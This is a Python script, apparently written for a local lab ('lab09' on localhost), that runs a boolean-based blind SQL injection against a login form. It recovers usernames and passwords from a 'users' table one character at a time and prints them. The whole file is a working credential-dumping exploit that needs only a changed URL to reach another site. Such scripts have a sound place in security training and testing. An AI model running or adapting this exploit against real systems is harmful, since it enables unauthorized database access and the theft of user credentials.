import requests
import string

# Configuration
BASE_URL = "http://localhost/lab09/login.php"
SUCCESS_MARKER = "[+]"
CHARSET = string.ascii_letters + string.digits + string.punctuation
MAX_LEN = 64

def check(payload):
    params = {"u": payload, "p": "x"}
    try:
        r = requests.get(BASE_URL, params=params, timeout=5)
        return SUCCESS_MARKER in r.text
    except requests.exceptions.RequestException:
        return False

def extract_field(row_index, field_name):
    result = ""
    for pos in range(1, MAX_LEN + 1):
        found_char = False
        for ch in CHARSET:
            # Skip characters that interfere with the SQL string literal
            if ch in ("'", "\\"):
                continue
            
            # The payload: classic boolean-based blind injection
            payload = f"' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- "
            
            if check(payload):
                result += ch
                found_char = True
                print(f"  [DEBUG] Row {row_index+1} | {field_name}[{pos}] = {ch}", flush=True)
                break
        
        # If no character matched at this position, we've reached the end of the string
        if not found_char:
            break
    return result

def main():
    print("=== Blind SQL Injection Dump Starting ===\n")
    users = []

    for i in range(100):
        print(f"[*] Attempting to extract row {i+1}...")
        
        username = extract_field(i, "username")
        
        # If the username comes back empty, there are no more rows in the DB
        if not username:
            print("[!] No more data found or query failed.")
            break
            
        password = extract_field(i, "password")
        users.append((username, password))
        print(f"  --> FOUND: {username} : {password}\n")

    print("=== FINAL RESULTS ===")
    if not users:
        print("No data recovered.")
    for u, p in users:
        print(f"User: {u} | Pass: {p}")

if __name__ == "__main__":
    main()
